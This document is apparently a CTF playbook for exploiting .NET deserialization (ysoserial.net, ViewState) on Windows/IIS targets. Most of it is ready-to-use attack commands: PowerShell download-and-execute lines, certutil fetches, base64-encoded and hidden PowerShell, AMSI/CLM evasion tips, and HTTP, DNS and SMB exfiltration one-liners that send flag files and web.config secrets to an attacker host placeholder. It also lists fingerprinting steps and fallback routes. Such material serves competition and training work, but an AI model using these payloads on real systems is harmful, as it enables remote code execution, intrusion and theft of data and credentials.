# Windows Targets — the deserialization path on a Windows box

## The shape — .NET on Windows is a different environment

A Windows ASP.NET target changes the payload shape AND the exfil path —
`cmd /c`, `powershell`, `certutil`, different flag paths, no `/bin/sh`.

## The command shapes — `-c` for Windows

```bash
# the -c arg is the verbatim command — Windows forms:
-c "cmd /c whoami"
-c "cmd /c type C:\\flag.txt"
-c "cmd /c dir C:\\"
-c "cmd /c powershell -enc <b64>"
-c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://YOU/x.ps1')"
-c "certutil -urlcache -split -f http://YOU/x.txt C:\\x.txt"
-c "cmd /c nslookup `whoami`.YOU"
```

## The flag paths — Windows-side

```
C:\flag.txt  C:\flag  C:\inetpub\wwwroot\flag.txt  C:\inetpub\flag
C:\Users\*\flag.txt   C:\Windows\Temp\flag.txt
%FLAG% env var        → cmd /c echo %FLAG% / set | findstr /i flag
C:\inetpub\wwwroot\web.config  → machineKey + the flag sometimes
```

`type` is the `cat` — `dir`/`findstr` are the search.

## The PowerShell shapes — encoded payloads

```powershell
# the -enc form is base64'd UTF-16LE — the standard obfuscation
powershell -enc SQBFAFgA...
powershell -e <b64>
powershell -exec bypass -c "IEX(...)"
powershell -w hidden -noni -c "..."
```

Encode a payload: `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('cmd'))`

## The exfil channels — Windows-side

```cmd
:: HTTP exfil — certutil/powershell/iwr
certutil -urlcache -split -f http://YOU/x.txt C:\x.txt
powershell -c "iwr -Uri http://YOU/x -Method Post -Body (gc C:\flag.txt)"
powershell -c "(New-Object Net.WebClient).UploadString('http://YOU','/flag content')"

:: DNS exfil
nslookup %COMPUTERNAME%.YOU
for /f %i in ('type C:\flag.txt') do nslookup %i.YOU

:: SMB exfil — the Windows-native
copy C:\flag.txt \\YOU\share\flag.txt
net use \\YOU\share /u:x y && copy C:\flag.txt \\YOU\share\
```

## The ViewState on Windows — the native habitat

`__VIEWSTATE` is the Windows-native case — `dotnet-viewstate.md` covers
the machineKey hunt + `ysoserial.net -p ViewState`. The `-c` is a `cmd /c`
or `powershell` form on Windows targets.

## The OOB listener on Windows — the receiving side

```bash
# the listener is still yours — the target hits it
python3 tools/web/oob_listener.py serve --port 8000 --log hits.jsonl
# OR on a Windows box you control — netcat/ps listener
```

The SMB reach — `\\YOU\share\file` — is the Windows-native exfil, but it
needs the target to reach 445 outbound — often blocked.

## The .NET gadget pick on Windows — the full catalog applies

`ysoserial.net` targets Windows .NET AND Mono — `TypeConfuseDelegate` /
`TypeConfuseDelegateMono` for the runtime split. `ActivitySurrogateSelector`
works on both — it compiles an assembly via CodeDOM.

## The "is this Windows or Linux" fingerprint

- `Server: Microsoft-IIS/X.X` header → Windows+IIS
- `.aspx`/`.ashx`/`.asmx`/`web.config` → ASP.NET on IIS → Windows
- `cmd /c` vs `/bin/sh` in a reflected command test
- `C:\`/`D:\` paths in an error → Windows
- `X-Powered-By: ASP.NET` → IIS/Windows (Mono is rare)

## Falsifiers — the Windows-specific dead-ends

- `powershell` blocked (Constrained Language Mode / AMSI) → `cmd /c` direct
- egress blocked except SMB → `\\YOU\share` only
- `ViewStateUserKey` bound to unknown session → ViewState unforgeable
- WDAC/CLM blocking the process-start gadget → file-write via a benign
  `ObjectDataProvider`+writer class

## Output to record

- The Windows command shape used (`cmd /c`/`powershell -enc`/`certutil`)
- The flag path + the verbatim response/OOB
- The gadget+formatter+`-c` exactly as invoked
